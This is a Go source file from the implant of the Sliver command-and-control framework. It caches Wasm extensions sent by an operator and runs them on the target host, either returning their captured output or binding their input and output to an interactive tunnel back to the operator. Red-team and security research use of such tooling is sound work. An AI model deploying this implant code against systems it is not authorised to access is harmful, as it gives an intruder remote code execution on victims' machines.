package tunnel_handlers

import (
	"bytes"
	"fmt"
	"io"
	"sync"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/encoders"
	"github.com/bishopfox/sliver/implant/sliver/extension"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

var (
	wasmExtensionCacheMu sync.RWMutex
	wasmExtensionCache   = map[string]*pb.RegisterWasmExtensionReq{}
)

// GetWasmExtension returns a registered Wasm extension.
func GetWasmExtension(name string) (*pb.RegisterWasmExtensionReq, bool) {
	wasmExtensionCacheMu.RLock()
	defer wasmExtensionCacheMu.RUnlock()
	extension, ok := wasmExtensionCache[name]
	return extension, ok
}

// SetWasmExtension registers or replaces a Wasm extension.
func SetWasmExtension(extension *pb.RegisterWasmExtensionReq) {
	wasmExtensionCacheMu.Lock()
	defer wasmExtensionCacheMu.Unlock()
	wasmExtensionCache[extension.Name] = extension
}

// ListWasmExtensions returns the registered Wasm extension names.
func ListWasmExtensions() []string {
	wasmExtensionCacheMu.RLock()
	defer wasmExtensionCacheMu.RUnlock()
	names := make([]string, 0, len(wasmExtensionCache))
	for name := range wasmExtensionCache {
		names = append(names, name)
	}
	return names
}

// DeleteWasmExtension removes a registered Wasm extension.
func DeleteWasmExtension(name string) bool {
	wasmExtensionCacheMu.Lock()
	defer wasmExtensionCacheMu.Unlock()
	if _, ok := wasmExtensionCache[name]; !ok {
		return false
	}
	delete(wasmExtensionCache, name)
	return true
}

// ExecWasmExtensionHandler - Execute a Wasm extension
func ExecWasmExtensionHandler(envelope *pb.Envelope, connection *transports.Connection) {
	req := &pb.ExecWasmExtensionReq{}
	err := proto.Unmarshal(envelope.Data, req)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding message: %v", err)
		// {{end}}
		return
	}

	extReq, ok := GetWasmExtension(req.Name)
	if !ok {
		// {{if .Config.Debug}}
		log.Printf("Wasm extension '%s' not found", req.Name)
		// {{end}}
		return
	}

	wasmBin, err := encoders.Gzip.Decode(extReq.WasmGz)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error decoding Wasm extension: %v", err)
		// {{end}}
		return
	}

	// {{if .Config.Debug}}
	log.Printf("Decompressed size %d bytes", len(wasmBin))
	// {{end}}

	wasmExtRuntime, err := extension.NewWasmExtension(extReq.Name, wasmBin, req.MemFS)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error creating wasm extension: %v", err)
		// {{end}}
		return
	}

	var data []byte
	if req.Interactive {
		data, _ = runInteractive(req, connection, wasmExtRuntime)
	} else {
		data, _ = runNonInteractive(req, wasmExtRuntime)
	}
	connection.Send <- &pb.Envelope{
		ID:   envelope.ID,
		Type: pb.MsgExecWasmExtension,
		Data: data,
	}
}

func runNonInteractive(req *pb.ExecWasmExtensionReq, wasm *extension.WasmExtension) ([]byte, error) {
	// {{if .Config.Debug}}
	log.Printf("Executing non-interactive wasm extension")
	// {{end}}

	defer wasm.Close()
	stdout := &bytes.Buffer{}
	stderr := &bytes.Buffer{}
	var readers sync.WaitGroup
	readers.Add(2)
	go func() {
		defer readers.Done()
		if _, err := io.Copy(stdout, wasm.Stdout.Reader); err != nil {
			// {{if .Config.Debug}}
			log.Printf("error reading stdout: %v", err)
			// {{end}}
		}
	}()
	go func() {
		defer readers.Done()
		if _, err := io.Copy(stderr, wasm.Stderr.Reader); err != nil {
			// {{if .Config.Debug}}
			log.Printf("error reading stderr: %v", err)
			// {{end}}
		}
	}()

	exitCode, err := wasm.Execute(req.Args)
	errMsg := ""
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("error executing wasm extension: %v", err)
		// {{end}}
		errMsg = err.Error()
	}
	_ = wasm.Stdout.Writer.Close()
	_ = wasm.Stderr.Writer.Close()
	readers.Wait()

	return proto.Marshal(&pb.ExecWasmExtension{
		Stdout:   stdout.Bytes(),
		Stderr:   stderr.Bytes(),
		ExitCode: exitCode,
		Response: &commonpb.Response{Err: errMsg},
	})
}

func runInteractive(req *pb.ExecWasmExtensionReq, conn *transports.Connection, wasm *extension.WasmExtension) ([]byte, error) {
	// {{if .Config.Debug}}
	log.Printf("[wasm] Executing interactive wasm extension on tunnel %d", req.TunnelID)
	// {{end}}

	// {{if .Config.Debug}}
	log.Printf("[wasm] binding to tunnel ...")
	// {{end}}
	tunnel := transports.NewTunnel(
		req.TunnelID,
		wasm.Stdin.Writer,
		wasm.Stdout.Reader,
		// wasm.Stderr.Reader,
	)
	conn.AddTunnel(tunnel)

	// Cleanup function with arguments
	cleanup := func(reason string, err error) {
		// {{if .Config.Debug}}
		log.Printf("[wasm] Closing tunnel request %d (%s). Err: %v", tunnel.ID, reason, err)
		// {{end}}
		tunnelClose, _ := proto.Marshal(&pb.TunnelData{
			Closed:   true,
			TunnelID: tunnel.ID,
		})
		conn.Send <- &pb.Envelope{
			Type: pb.MsgTunnelClose,
			Data: tunnelClose,
		}
	}

	go func() (uint32, error) {
		// {{if .Config.Debug}}
		log.Printf("[wasm] executing module entrypoint ...")
		// {{end}}
		// Execute the Wasm extension
		exitCode, err := wasm.Execute(req.Args)
		if err != nil || exitCode != 0 {
			// {{if .Config.Debug}}
			log.Printf("[wasm] error executing wasm extension (%d): %v", exitCode, err)
			// {{end}}
		}
		// {{if .Config.Debug}}
		log.Printf("[wasm] exit code: %d", exitCode)
		log.Printf("[wasm] closing tunnel ...")
		// {{end}}
		wasm.Stdout.Writer.Write([]byte(fmt.Sprintf("\r\n*** exit code %d ***\r\n", exitCode)))
		wasm.Stdout.Writer.Write([]byte("Wait 10 seconds and press <enter> to continue ...\r\n"))
		wasm.Close()
		tunnel.Close()
		return exitCode, err
	}()

	// {{if .Config.Debug}}
	log.Printf("[wasm] starting tWriters/stream readers ...")
	// {{end}}
	for _, rc := range tunnel.Readers {
		if rc == nil {
			continue
		}
		go func(stream io.ReadCloser) {
			tWriter := tunnelWriter{
				conn: conn,
				tun:  tunnel,
			}
			// {{if .Config.Debug}}
			log.Printf("[wasm] tWriter: %v stream: %v", tWriter, stream)
			// {{end}}
			_, err := io.Copy(tWriter, stream)
			if err != nil {
				cleanup("io error", err)
				return
			}
			if err == io.EOF {
				cleanup("EOF", err)
				return
			}
		}(rc)
	}

	return proto.Marshal(&pb.ExecWasmExtension{
		Response: &commonpb.Response{Err: ""},
	})
}
